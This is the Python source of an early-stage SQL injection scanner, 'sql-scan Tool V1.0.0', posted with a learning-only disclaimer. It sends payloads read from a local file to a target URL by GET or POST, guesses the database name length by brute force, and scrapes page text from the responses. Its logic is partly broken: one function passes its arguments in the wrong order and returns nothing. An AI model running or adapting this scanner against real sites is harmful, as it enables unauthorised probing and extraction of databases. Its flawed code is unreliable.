#!/usr/bin/env python

import requests
import sys
import argparse
import re
from bs4 import BeautifulSoup

Version = "sql-scan Tool V1.0.0"
Title = '''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo = f'''
                Github==>https://github.com/interstin/sql-scan 
                {Version}  '''

#get请求
def get(url,payload):
    url=url+payload
    result = requests.get(url).text
    #print("你访问的url为：",url,"\t访问方式为get")
    return result

#post请求
def post(url,payload,data):
    data = data.replace('*',payload)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    result = requests.post(url,data=data,headers=headers).text
    #print("你访问的url为：",url,"\t访问方式为post")
    return result


s_data="hello"
#搜索对应数据
def search_data(data):
    soup = BeautifulSoup(data, 'html.parser')
    p_data = soup.find_all('p')
    for data in p_data:
        match = re.search(s_data,data.get_text())
        if match:
            return data.get_text()[:match.start()]
        
#检查是否存在注入
def check_sql(url,method,data,payload):
    if method =='get':
        result = get(url,payload)
    elif method =='post':
        result = post(url,data,payload)

        

def scan(url,method,data):
    with open('len.txt','r') as file:
        for payload in file:
            if data==None:
                data =''
            len = 1
            if method =='get':
                result = get(url,payload)
            elif method =='post':
                #猜数据库长度
                while len<20:
                    payload = payload.replace("*",str(len))
                    result = post(url,payload,data)
                    if "Logon failure" in result:
                        #print(result)
                        print("数据库的长度为：{}".format(len))
                        return
                    payload = payload.replace(str(len),"*")
                    len+=1
                
            
            #判断是否存在注入
            check_sql(url,method,data,payload)
            #搜索数据
            result = search_data(result)
            print(result)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-U", "--url",required=True, help="URL to scan")
    parser.add_argument("-M","--method",default='get',help="get or post or others method,default is get")
    parser.add_argument("-D","--data",help="the data that you want to post，you want check palces use * replace")
    args = parser.parse_args()

    if args.url==None:
        print("请指定你要访问的地址:\n如test.py -u http://xxxxx") 
    elif not re.search(r"(?i)\Ahttp[s]*://", args.url):
        args.url = "http://%s" % args.url 
    #print("你访问的url为：",args.url)
    
    scan(args.url,args.method,args.data)



if __name__=='__main__':
    print(Logo,'\n')
    main()